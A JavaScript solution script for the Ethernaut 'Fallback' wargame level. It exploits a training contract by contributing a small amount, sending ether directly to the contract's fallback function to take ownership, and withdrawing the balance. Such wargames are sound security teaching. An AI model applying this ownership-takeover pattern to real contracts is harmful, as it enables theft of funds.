const loader = require('../loader.js')
const web3 = require('../web3.js')
const readline = require('readline-sync');

(async () => {
  try {
    const instance = readline.question(
`What is the deployed instance address?
(If necessary, first get a new instance at
https://solidity-05.ethernaut.openzeppelin.com/level/0xD95B091f19946d6ef0c88f8CD360c0d6E408876E)
> `)
    // load victim contract just instantiated
    const victim = loader.web3.fromArtifact('Fallback', instance)
    console.log('Contribute 100 wei...')
    await victim.methods.contribute().send({ value: 100 })
    console.log('Send 100 wei to fallback...')
    await web3.eth.sendTransaction({ value: 100 })
    console.log('withdraw funds...')
    await victim.methods.withdraw().send()
    console.log('Done. You can submit your instance in the browser.')
  } catch (err) {
    console.log(err.message)
  }
})()

// process.exit()
